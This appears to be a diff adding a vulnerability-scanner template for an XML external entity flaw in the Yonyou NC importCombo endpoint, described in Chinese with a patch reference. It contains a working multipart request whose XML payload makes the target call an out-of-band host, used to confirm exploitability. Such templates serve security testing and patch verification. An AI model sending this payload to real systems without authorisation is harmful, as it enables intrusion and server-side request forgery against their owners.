@@ -1,0 +1,45 @@
+id: yonyou-nc-importCombo-xxe
+info:
+  name: 用友NC importCombo XML实体注入（XXE）漏洞
+  author: leadlife
+  severity: critical
+  description: 用友NC系统存在XML外部实体注入（XXE）漏洞。攻击者可通过构造恶意XML文件，利用importCombo接口上传并解析，实现任意文件读取或SSRF攻击等攻击，进而可能导致敏感信息泄露或进一步的系统入侵。
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/cozma2okebge6qp6
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    hunter-query: demo
+    tips:
+    repair: 尽快更新官方补丁,官方通告链接：https://security.yonyou.com/#/noticeInfo?id=725
+    version:
+  tags: yonyou,nc,xxe,oob
+
+http:
+  - raw:
+      - |
+        POST /portal/pt/portalcombo/importCombo?pageId=login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+        Content-Length: 249
+
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="file"; filename="1.png"
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE root [
+        <!ENTITY % remote SYSTEM "http://{{interactsh-url}}">
+        %remote;]>
+        <root/>
+        ------WebKitFormBoundary--
+        
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
